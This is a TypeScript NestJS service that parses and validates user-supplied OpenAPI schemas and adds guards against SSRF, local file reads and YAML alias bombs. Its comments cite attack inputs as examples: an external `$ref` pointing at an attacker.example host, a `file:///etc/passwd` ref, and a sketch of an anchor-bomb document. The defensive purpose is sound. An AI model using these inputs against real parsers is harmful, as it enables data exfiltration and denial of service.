import { Injectable, Logger } from '@nestjs/common';
import SwaggerParser from '@apidevtools/swagger-parser';
import { OpenAPIV3 } from 'openapi-types';

import { Operation, HttpMethod, OperationType } from '../../../entities/operation.entity';
import { Resource, ResourceType } from '../../../entities/resource.entity';
import { SchemaParser, ParsedSchema, ParsedOperation, ParsedResource } from '../interfaces/parser.interface';

/**
 * Hard size cap on incoming raw schemas. Bumped from 5 MB → 100 MB
 * to cover real-world specs (Stripe ~7.7 MB, AWS-class ~30 MB,
 * GitHub REST ~12 MB). The parse path itself was rewritten to be
 * memory-bounded — see the extractor changes — so a 100 MB JSON
 * doesn't expand into a 1 GB dereferenced tree like it used to.
 */
const MAX_SCHEMA_BYTES = 100 * 1024 * 1024; // 100 MB

/**
 * A document's *shape* is bounded separately from its byte size,
 * because the two come apart.
 *
 * YAML anchors and aliases share references, so js-yaml loads
 *
 *     a:  &a  ["x", ... 9 of them ...]
 *     l0: &l0 [*a, *a, ... 9 of them ...]
 *     ... eleven levels ...
 *
 * in under a millisecond from 356 bytes — the object graph really is
 * tiny. But the document it *denotes* has 9^12 nodes, and anything that
 * walks it as a tree (this file's `$ref` sweep did, and JSON.stringify
 * on the way to the database does) runs for geological time. Bull's job
 * `timeout` cannot save us: the walk is synchronous, so it blocks the
 * event loop of the process that also serves the API.
 *
 * The cap is expressed against the source length rather than as a flat
 * number, because that is exactly the property being defended: an
 * honest document cannot denote materially more nodes than it has
 * characters to describe them with (the cheapest JSON node is a couple
 * of bytes). Anything past that ratio is alias amplification. The floor
 * keeps small, oddly-shaped-but-legitimate documents out of it.
 */
const MIN_EXPANDED_NODES = 100_000;

/**
 * Structural nesting limit. Note this is now enforced by *throwing* —
 * the previous guard `return`ed past its limit, so a `$ref` buried
 * below it was never inspected at all: a security sweep that failed
 * open at exactly the depth an attacker controls.
 */
const MAX_SCHEMA_DEPTH = 1000;

/**
 * Parser options that disable EXTERNAL $ref resolution. Without this,
 * SwaggerParser.dereference() happily follows `$ref: "http://..."` or
 * `$ref: "file:///etc/passwd"` — a classic SSRF + local-file-read
 * vector via user-supplied schemas.
 *
 * Internal JSON-Pointer refs (`$ref: "#/components/schemas/..."`)
 * still work because they don't touch the network or filesystem.
 */
const SAFE_PARSER_OPTIONS = {
  resolve: {
    external: false,
    http: false as any,
    file: false as any,
  },
} as const;

@Injectable()
export class OpenAPIParserService implements SchemaParser {
  private readonly logger = new Logger(OpenAPIParserService.name);

  async parseSchema(rawSchema: string, fileName?: string): Promise<ParsedSchema> {
    try {
      if (typeof rawSchema === 'string' && rawSchema.length > MAX_SCHEMA_BYTES) {
        throw new Error(`Schema exceeds max size of ${MAX_SCHEMA_BYTES} bytes`);
      }
      let schemaObject: any;
      try {
        schemaObject = JSON.parse(rawSchema);
      } catch {
        // Not JSON — try YAML
        try {
          const yaml = require('js-yaml');
          schemaObject = yaml.load(rawSchema);
        } catch {
          schemaObject = rawSchema;
        }
      }

      // Skip SwaggerParser.dereference. It deep-clones every $ref
      // into every operation that mentions it — for a Stripe-class
      // spec where one Pet/Customer/Charge schema is referenced
      // from 100+ operations, the dereferenced tree balloons to
      // 5-10× the raw schema size and was the dominant cause of
      // the 7.7 MB Stripe import OOM-killing the worker.
      //
      // Instead, we walk the spec lazily and resolve internal $refs
      // one hop at a time as each operation is built. External $refs
      // remain blocked (SSRF / local-file-read protection); same as
      // before. The components.schemas pool stays in `originalSchema`
      // metadata for resource extraction but isn't cloned per op.
      const api = schemaObject as OpenAPIV3.Document;
      this.assertSafeDocument(api, rawSchema);

      // Snapshot the small bits we want to surface in the result
      // BEFORE we start tearing down `api`. Once these are captured
      // we can progressively drop traversed sub-trees from `api` so
      // the per-path wrappers (description, tags, summary objects)
      // become GC-eligible before extraction even returns. The
      // schema *sub-objects* themselves are still held by the
      // returned operations[] / resources[] entries — that's the
      // data we need to persist and translate into tools.
      const version = api.openapi || '3.0.0';
      const info = {
        title: api.info.title,
        description: api.info.description,
        version: api.info.version,
      };
      const metadata = {
        servers: api.servers,
        externalDocs: api.externalDocs,
        tags: api.tags,
        fileName,
      };

      const operations = await this.extractOperationsFromOpenAPI(api);
      // After operations are extracted, the path-level wrappers
      // (operation summaries, tags, security stanzas, callbacks)
      // are no longer needed. Drop the paths object so the per-
      // path/per-method wrappers can be GC'd while resource
      // extraction is still walking components.schemas.
      delete (api as any).paths;
      const resources = await this.extractResourcesFromOpenAPI(api);
      // Same idea for components — once resources are produced,
      // the components container (parameters, requestBodies,
      // responses, securitySchemes, callbacks, links, examples,
      // headers) is dead weight. Drop it.
      delete (api as any).components;

      return {
        version,
        info,
        operations,
        resources,
        metadata,
      };
    } catch (error) {
      this.logger.error(`Failed to parse OpenAPI schema: ${error.message}`);
      throw new Error(`Invalid OpenAPI schema: ${error.message}`);
    }
  }

  /**
   * One sweep of the loaded document that establishes everything the
   * rest of the parser assumes about its shape.
   *
   *   - no `$ref` targets an external URL or a local file. Internal
   *     JSON-Pointer refs (`#/components/...`) are kept and resolved
   *     lazily; without this guard a user-supplied schema could
   *     exfiltrate via `$ref: "http://attacker.example/leak"` or read
   *     local files;
   *   - nesting stays under `MAX_SCHEMA_DEPTH`, and going over it
   *     THROWS. The previous version returned instead, which meant a
   *     `$ref` buried 1001 levels down was never looked at — the check
   *     failed open at exactly the depth the attacker chooses;
   *   - the document does not *denote* vastly more nodes than it spends
   *     characters describing. See `MIN_EXPANDED_NODES`.
   *
   * The walk is memoised on node identity, so a document that shares
   * subtrees (every YAML alias does, and so does an honest spec that
   * anchors a common parameter block) costs one visit per distinct
   * node rather than one per path reaching it. That memo is the whole
   * defence: the old tree walk visited 11.4 million nodes for a 356-byte
   * input, and each extra alias level multiplied it by the fan-out.
   *
   * A node encountered while it is still on the current path is a cycle
   * — js-yaml builds those from recursive anchors (`a: &a {b: *a}`) and
   * they have no finite expansion, so they are refused outright. They
   * would also make `JSON.stringify` throw further downstream, where
   * the failure is far less legible.
   */
  private assertSafeDocument(root: any, rawSchema: unknown): void {
    const maxNodes = Math.max(
      MIN_EXPANDED_NODES,
      typeof rawSchema === 'string' ? rawSchema.length : 0,
    );
    const expandedSize = new Map<object, number>();
    const onPath = new Set<object>();

    const visit = (node: any, depth: number): number => {
      if (!node || typeof node !== 'object') return 1;

      if (depth > MAX_SCHEMA_DEPTH) {
        throw new Error(
          `Schema nesting exceeds the ${MAX_SCHEMA_DEPTH}-level limit`,
        );
      }
      if (onPath.has(node)) {
        throw new Error('Schema contains a cyclic YAML anchor/alias');
      }

      const memo = expandedSize.get(node);
      if (memo !== undefined) return memo;

      if (typeof node.$ref === 'string' && !node.$ref.startsWith('#/')) {
        throw new Error(`External $ref blocked: ${node.$ref}`);
      }

      onPath.add(node);
      let size = 1;
      for (const child of Array.isArray(node) ? node : Object.values(node)) {
        size += visit(child, depth + 1);
        if (size > maxNodes) {
          throw new Error(
            `Schema expands to more than ${maxNodes} nodes — ` +
              'refusing an anchor/alias bomb',
          );
        }
      }
      onPath.delete(node);
      expandedSize.set(node, size);
      return size;
    };

    visit(root, 0);
  }

  async validateSchema(schema: string): Promise<{ isValid: boolean; errors: string[] }> {
    try {
      if (typeof schema === 'string' && schema.length > MAX_SCHEMA_BYTES) {
        return {
          isValid: false,
          errors: [`Schema exceeds max size of ${MAX_SCHEMA_BYTES} bytes`],
        };
      }
      let schemaObject: any;
      try {
        schemaObject = JSON.parse(schema);
      } catch {
        try {
          const yaml = require('js-yaml');
          schemaObject = yaml.load(schema);
        } catch {
          schemaObject = schema;
        }
      }
      await SwaggerParser.validate(schemaObject, SAFE_PARSER_OPTIONS as any);
      return { isValid: true, errors: [] };
    } catch (error) {
      return {
        isValid: false,
        errors: [error.message],
      };
    }
  }

  async extractOperations(schema: ParsedSchema): Promise<Operation[]> {
    const operations: Operation[] = [];

    for (const parsedOp of schema.operations) {
      const operation = new Operation();
      operation.name = parsedOp.name;
      operation.operationId = parsedOp.operationId;
      operation.description = parsedOp.description;
      operation.method = parsedOp.method as HttpMethod;
      operation.endpoint = parsedOp.endpoint;
      operation.type = this.determineOperationType(parsedOp.method);
      operation.parameters = parsedOp.parameters;
      operation.responses = parsedOp.responses;
      operation.security = parsedOp.security;
      operation.tags = parsedOp.tags;
      operation.deprecated = parsedOp.deprecated || false;
      operation.isActive = true;

      operations.push(operation);
    }

    return operations;
  }

  async extractResources(schema: ParsedSchema): Promise<Resource[]> {
    const resources: Resource[] = [];

    for (const parsedResource of schema.resources) {
      const resource = new Resource();
      resource.name = parsedResource.name;
      resource.description = parsedResource.description;
      resource.type = parsedResource.type as ResourceType;
      resource.properties = parsedResource.properties;
      resource.schema = parsedResource.schema;
      resource.examples = parsedResource.examples;
      resource.isActive = true;

      resources.push(resource);
    }

    return resources;
  }

  private async extractOperationsFromOpenAPI(api: OpenAPIV3.Document): Promise<ParsedOperation[]> {
    const operations: ParsedOperation[] = [];

    for (const [path, pathItem] of Object.entries(api.paths || {})) {
      if (!pathItem) continue;

      // Path-level parameters apply to all operations in this path
      const pathParams = (pathItem as any).parameters as (OpenAPIV3.ReferenceObject | OpenAPIV3.ParameterObject)[] | undefined;

      for (const [method, operation] of Object.entries(pathItem)) {
        if (!operation || typeof operation !== 'object') continue;
        if (!['get', 'post', 'put', 'patch', 'delete', 'options', 'head'].includes(method)) continue;

        const opObject = operation as OpenAPIV3.OperationObject;

        // Merge path-level params with operation-level params (operation takes precedence)
        const allParams = [...(pathParams || []), ...(opObject.parameters || [])];

        const parsedOperation: ParsedOperation = {
          operationId: opObject.operationId || `${method}_${path.replace(/[^a-zA-Z0-9]/g, '_')}`,
          name: opObject.summary || opObject.operationId || `${method.toUpperCase()} ${path}`,
          description: opObject.description,
          method: method.toUpperCase(),
          endpoint: path,
          parameters: this.extractParameters(allParams.length > 0 ? allParams : undefined, opObject.requestBody, api),
          responses: this.extractResponses(opObject.responses, api),
          security: opObject.security,
          tags: opObject.tags,
          deprecated: opObject.deprecated,
        };

        operations.push(parsedOperation);
      }
    }

    return operations;
  }

  private async extractResourcesFromOpenAPI(api: OpenAPIV3.Document): Promise<ParsedResource[]> {
    const resources: ParsedResource[] = [];

    if (api.components?.schemas) {
      for (const [name, schemaRef] of Object.entries(api.components.schemas)) {
        const schema = this.resolveReference(schemaRef, api);

        if (schema && typeof schema === 'object') {
          const resource: ParsedResource = {
            name,
            description: schema.description,
            type: this.determineResourceType(schema),
            properties: this.extractPropertiesFromSchema(schema),
            schema: schema as Record<string, any>,
            examples: schema.examples ? [schema.examples] : undefined,
          };

          resources.push(resource);
        }
      }
    }

    return resources;
  }

  private extractParameters(
    parameters: (OpenAPIV3.ReferenceObject | OpenAPIV3.ParameterObject)[] | undefined,
    requestBody: OpenAPIV3.ReferenceObject | OpenAPIV3.RequestBodyObject | undefined,
    document: OpenAPIV3.Document,
  ): any {
    const result: any = {
      path: {},
      query: {},
      header: {},
      body: {},
    };

    // Extract parameters
    if (parameters) {
      for (const paramRef of parameters) {
        const param = this.resolveReference(paramRef, document) as OpenAPIV3.ParameterObject;
        if (!param) continue;

        const paramSchema = {
          type: (param.schema && 'type' in param.schema) ? param.schema.type || 'string' : 'string',
          description: param.description,
          required: param.required,
          example: param.example,
          schema: param.schema,
        };

        switch (param.in) {
          case 'path':
            result.path[param.name] = paramSchema;
            break;
          case 'query':
            result.query[param.name] = paramSchema;
            break;
          case 'header':
            result.header[param.name] = paramSchema;
            break;
          case 'body':
            // Swagger 2.0 body parameter
            result.body = {
              schema: param.schema,
              required: param.required,
              description: param.description,
            };
            break;
        }
      }
    }

    // Extract request body
    if (requestBody) {
      const bodyObject = this.resolveReference(requestBody, document) as OpenAPIV3.RequestBodyObject;
      if (bodyObject?.content) {
        const contentType = Object.keys(bodyObject.content)[0];
        const mediaType = bodyObject.content[contentType];
        
        result.body = {
          contentType,
          schema: mediaType.schema,
          required: bodyObject.required,
          description: bodyObject.description,
        };
      }
    }

    return result;
  }

  private extractResponses(
    responses: OpenAPIV3.ResponsesObject | undefined,
    document: OpenAPIV3.Document,
  ): Record<string, any> {
    const result: Record<string, any> = {};

    if (responses) {
      for (const [statusCode, responseRef] of Object.entries(responses)) {
        const response = this.resolveReference(responseRef, document) as OpenAPIV3.ResponseObject;
        if (!response) continue;

        result[statusCode] = {
          description: response.description,
          schema: response.content ? this.extractSchemaFromContent(response.content) : undefined,
          examples: response.content ? this.extractExamplesFromContent(response.content, document) : undefined,
          headers: response.headers,
        };
      }
    }

    return result;
  }

  private extractSchemaFromContent(content: { [media: string]: OpenAPIV3.MediaTypeObject }): any {
    const firstMediaType = Object.values(content)[0];
    return firstMediaType?.schema;
  }

  private extractExamplesFromContent(
    content: { [media: string]: OpenAPIV3.MediaTypeObject },
    document: OpenAPIV3.Document,
  ): any[] {
    const examples: any[] = [];

    for (const mediaType of Object.values(content)) {
      if (mediaType.example) {
        examples.push(mediaType.example);
      }
      if (mediaType.examples) {
        for (const example of Object.values(mediaType.examples)) {
          const resolvedExample = this.resolveReference(example, document);
          if (resolvedExample && typeof resolvedExample === 'object' && 'value' in resolvedExample) {
            examples.push(resolvedExample.value);
          }
        }
      }
    }

    return examples;
  }

  private extractPropertiesFromSchema(schema: any): Record<string, any> {
    const properties: Record<string, any> = {};

    if (schema.properties) {
      for (const [name, propSchema] of Object.entries(schema.properties)) {
        properties[name] = {
          type: propSchema,
          required: schema.required?.includes(name) || false,
          description: (propSchema as any)?.description,
        };
      }
    }

    return properties;
  }

  private determineResourceType(schema: any): ResourceType {
    if (schema.enum) {
      return ResourceType.ENUM;
    }
    if (schema.type === 'object') {
      return ResourceType.MODEL;
    }
    return ResourceType.MODEL;
  }

  private determineOperationType(method: string): OperationType {
    switch (method.toLowerCase()) {
      case 'get':
        return OperationType.QUERY;
      case 'post':
      case 'put':
      case 'patch':
      case 'delete':
        return OperationType.MUTATION;
      default:
        return OperationType.RPC;
    }
  }

  private resolveReference(ref: any, document?: OpenAPIV3.Document): any {
    if (ref && typeof ref === 'object' && '$ref' in ref) {
      // This is a simplified reference resolution
      // In a full implementation, you'd handle all reference types
      const refPath = ref.$ref.replace('#/', '').split('/');
      let current = document || {};
      
      for (const segment of refPath) {
        current = current[segment];
        if (!current) break;
      }
      
      return current;
    }
    
    return ref;
  }
}